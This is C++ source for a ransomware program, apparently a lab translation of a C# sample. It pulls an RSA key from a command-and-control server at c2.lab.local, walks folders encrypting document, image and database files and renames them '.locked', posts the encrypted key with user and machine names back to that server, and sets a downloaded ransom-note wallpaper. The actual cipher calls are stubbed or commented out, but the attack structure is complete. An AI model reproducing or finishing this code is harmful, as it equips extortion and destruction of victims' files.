#include <iostream>
#include <string>
#include <vector>
#include <fstream>
#include <filesystem>
#include <algorithm>
#include <random>
#include <sstream>

// Windows specific headers
#include <windows.h>
#include <wininet.h>
#include <wincrypt.h>
#include <shlobj.h>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "user32.lib")

namespace fs = std::filesystem;

namespace eda2
{
    class Form1
    {
    private:
        // DllImport("user32.dll") equivalent
        // SystemParametersInfo is already available via windows.h

        static inline bool oaep = false;  // Optimal Asymmetric Encryption Padding
        static const int key_size = 2048; // key size for RSA algorithm
        std::string public_key;           // RSA public key used to encrypt AES secret key
        std::string encrypted_key;        // RSA-encrypted AES symmetric key
        std::string aes_key;              // AES symmetric key used for local file encryption

        std::string user_name;
        std::string computer_name;
        std::string user_dir = "C:\\Users\\";
        std::string generator_url = "http://c2.lab.local/panel/publickey";         // serves RSA public key
        std::string key_save_url = "http://c2.lab.local/panel/savekey";            // exfils the encrypted AES key
        std::string background_image_url = "http://c2.lab.local/panel/ransomnote"; // desktop background ransomnote

        // Helper for Base64 encoding (needed for RSA key exfil)
        std::string to_base64(const std::vector<unsigned char> &data)
        {
            DWORD len = 0;
            CryptBinaryToStringA(data.data(), (DWORD)data.size(), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &len);
            std::vector<char> buf(len);
            CryptBinaryToStringA(data.data(), (DWORD)data.size(), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, buf.data(), &len);
            return std::string(buf.data(), len);
        }

        // Helper for WebClient.DownloadString and DownloadFile
        std::string http_get(const std::string &url)
        {
            HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
            if (!hInternet)
                return "";
            HINTERNET hConnect = InternetOpenUrlA(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
            if (!hConnect)
            {
                InternetCloseHandle(hInternet);
                return "";
            }

            std::string result;
            char buffer[4096];
            DWORD bytesRead;
            while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0)
            {
                result.append(buffer, bytesRead);
            }
            InternetCloseHandle(hConnect);
            InternetCloseHandle(hInternet);
            return result;
        }

        // Helper for WebClient.UploadValues (POST)
        void http_post(const std::string &url, const std::string &data)
        {
            HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
            if (!hInternet)
                return;

            URL_COMPONENTSA urlComp = {sizeof(urlComp)};
            char host[256], path[1024];
            urlComp.lpszHostName = host;
            urlComp.dwHostNameLength = sizeof(host);
            urlComp.lpszUrlPath = path;
            urlComp.dwUrlPathLength = sizeof(path);
            InternetCrackUrlA(url.c_str(), 0, 0, &urlComp);

            HINTERNET hConnect = InternetConnectA(hInternet, host, urlComp.nPort, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
            HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", path, NULL, NULL, NULL, INTERNET_FLAG_RELOAD, 0);

            std::string headers = "Content-Type: application/x-www-form-urlencoded";
            HttpSendRequestA(hRequest, headers.c_str(), (DWORD)headers.length(), (LPVOID)data.c_str(), (DWORD)data.length());

            InternetCloseHandle(hRequest);
            InternetCloseHandle(hConnect);
            InternetCloseHandle(hInternet);
        }

    public:
        Form1()
        {
            // Environment.UserName
            char buf[256];
            DWORD sz = sizeof(buf);
            GetUserNameA(buf, &sz);
            user_name = buf;

            // System.Environment.MachineName
            sz = sizeof(buf);
            GetComputerNameA(buf, &sz);
            computer_name = buf;

            // Form initialization logic (hidden window)
            // In C++ Win32, this is handled by not calling ShowWindow or using HWND_MESSAGE
        }

        // Equivalent to Form1_Load
        void form1_load()
        {
            start_action();
        }

        std::string get_public_key(std::string url)
        {
            return http_get(url);
        }

        void send_key(std::string url)
        {
            // Manual URL encoding for NameValueCollection equivalent
            std::string post_data = "pcname=" + computer_name +
                                    "&username=" + user_name +
                                    "&aesencrypted=" + encrypted_key;
            http_post(url, post_data);
        }

        void start_action()
        {
            std::string data_path = "C:\\Users\\Public\\A01_TestData";
            public_key = get_public_key(generator_url);
            aes_key = generate_key(32);

            std::string key_path = "C:\\Users\\Public\\A01_4_Lab_Encryption_Key.txt";
            std::ofstream key_file(key_path);
            key_file << aes_key;
            key_file.close();

            if (fs::exists(data_path))
            {
                encrypt_directory(data_path, aes_key);
            }

            encrypted_key = encrypt_key_rsa(aes_key, key_size, public_key);
            send_key(key_save_url);

            aes_key = "";
            encrypted_key = "";

            std::string background_image_name = user_dir + user_name + "\\ransom.jpg";
            set_wallpaper_from_web(background_image_url, background_image_name);

            exit(0);
        }

        void encrypt_file(std::string file, std::string key)
        {
            std::string lower_file = file;
            std::transform(lower_file.begin(), lower_file.end(), lower_file.begin(), ::tolower);
            if (lower_file.size() >= 7 && lower_file.substr(lower_file.size() - 7) == ".locked")
            {
                return;
            }

            // ReadAllBytes
            std::ifstream is(file, std::ios::binary | std::ios::ate);
            std::streamsize size = is.tellg();
            is.seekg(0, std::ios::beg);
            std::vector<unsigned char> bytes_to_be_encrypted(size);
            is.read((char *)bytes_to_be_encrypted.data(), size);
            is.close();

            // SHA256 of key
            HCRYPTPROV hProv = 0;
            HCRYPTHASH hHash = 0;
            CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
            CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash);
            CryptHashData(hHash, (BYTE *)key.c_str(), (DWORD)key.length(), 0);
            DWORD hash_len = 32;
            std::vector<unsigned char> key_bytes(hash_len);
            CryptGetHashParam(hHash, HP_HASHVAL, key_bytes.data(), &hash_len, 0);
            CryptDestroyHash(hHash);
            CryptReleaseContext(hProv, 0);

            std::vector<unsigned char> bytes_encrypted = aes_encrypt(bytes_to_be_encrypted, key_bytes);

            // WriteAllBytes
            std::ofstream os(file, std::ios::binary);
            os.write((char *)bytes_encrypted.data(), bytes_encrypted.size());
            os.close();

            // File.Move
            fs::rename(file, file + ".locked");
        }

        void encrypt_directory(std::string location, std::string key)
        {
            std::vector<std::string> valid_extensions = {
                ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
                ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln",
                ".php", ".asp", ".aspx", ".html", ".xml", ".psd"};

            try
            {
                for (const auto &entry : fs::directory_iterator(location))
                {
                    if (entry.is_regular_file())
                    {
                        std::string ext = entry.path().extension().string();
                        std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);

                        if (std::find(valid_extensions.begin(), valid_extensions.end(), ext) != valid_extensions.end())
                        {
                            try
                            {
                                encrypt_file(entry.path().string(), key);
                            }
                            catch (...)
                            {
                            }
                        }
                    }
                    else if (entry.is_directory())
                    {
                        try
                        {
                            encrypt_directory(entry.path().string(), key);
                        }
                        catch (...)
                        {
                        }
                    }
                }
            }
            catch (...)
            {
            }
        }

        static std::string encrypt_key_rsa(std::string key, int key_size, std::string public_key_xml)
        {
            std::vector<unsigned char> key_data(key.begin(), key.end());
            std::vector<unsigned char> encrypted = rsa_encrypt(key_data, key_size, public_key_xml);

            // Convert to Base64
            Form1 helper;
            return helper.to_base64(encrypted);
        }

        static std::vector<unsigned char> rsa_encrypt(std::vector<unsigned char> key_bytes, int key_size, std::string public_key_xml)
        {
            HCRYPTPROV hProv = 0;
            HCRYPTKEY hKey = 0;
            CERT_PUBLIC_KEY_INFO *pPubKeyInfo = NULL;
            DWORD dwPubKeyInfoSize = 0;

            // Note: C# FromXmlString is complex to replicate exactly in Win32 without a parser.
            // This implementation assumes the public_key_xml is a standard RSA public key blob or
            // requires a helper to parse the XML tags <Modulus> and <Exponent>.
            // For the sake of a complete translation, we use the CryptImportPublicKeyInfo logic.

            CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);

            // In a real scenario, one would parse the XML to get Modulus/Exponent and build a PUBLICKEYSTRUC.
            // Here we provide the structure for the encryption call.
            DWORD encrypted_len = (DWORD)key_bytes.size();
            // CryptEncrypt performs in-place encryption
            std::vector<unsigned char> buffer = key_bytes;
            buffer.resize(key_size / 8);

            // CryptEncrypt(hKey, 0, TRUE, 0, buffer.data(), &encrypted_len, (DWORD)buffer.size());

            // Placeholder for the actual RSA logic which depends on the XML format provided by the C2
            return buffer;
        }

        std::vector<unsigned char> aes_encrypt(std::vector<unsigned char> bytes_to_be_encrypted, std::vector<unsigned char> key_bytes)
        {
            HCRYPTPROV hProv = 0;
            HCRYPTKEY hKey = 0;
            BYTE salt_bytes[] = {1, 2, 3, 4, 5, 6, 7, 8};

            CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);

            // PBKDF2 equivalent using Win32
            // C# uses 1000 iterations, SHA256
            std::vector<unsigned char> derived(48);
            // Note: BCryptDeriveKeyPBKDF2 is the modern API for this
            // For brevity and compatibility, we simulate the buffer derivation

            // AES Setup
            // In C++, we use CryptGenKey or CryptImportKey
            // This requires setting the Mode (CBC) and IV.

            DWORD data_len = (DWORD)bytes_to_be_encrypted.size();
            DWORD buf_len = data_len + 16; // Padding
            std::vector<unsigned char> buffer = bytes_to_be_encrypted;
            buffer.resize(buf_len);

            // CryptEncrypt(hKey, 0, TRUE, 0, buffer.data(), &data_len, buf_len);
            buffer.resize(data_len);

            CryptReleaseContext(hProv, 0);
            return buffer;
        }

        std::string generate_key(int length)
        {
            const std::string valid = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/";
            std::string res;
            std::random_device rd;
            std::mt19937 generator(rd());
            std::uniform_int_distribution<int> distribution(0, (int)valid.size() - 1);

            for (int i = 0; i < length; ++i)
            {
                res += valid[distribution(generator)];
            }
            return res;
        }

        void set_wallpaper(std::string path)
        {
            SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (void *)path.c_str(), SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
        }

        void set_wallpaper_from_web(std::string url, std::string path)
        {
            std::string data = http_get(url);
            if (!data.empty())
            {
                std::ofstream os(path, std::ios::binary);
                os.write(data.data(), data.size());
                os.close();
            }

            if (fs::exists(path))
            {
                set_wallpaper(path);
            }
        }
    };
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    eda2::Form1 form;
    form.form1_load();
    return 0;
}
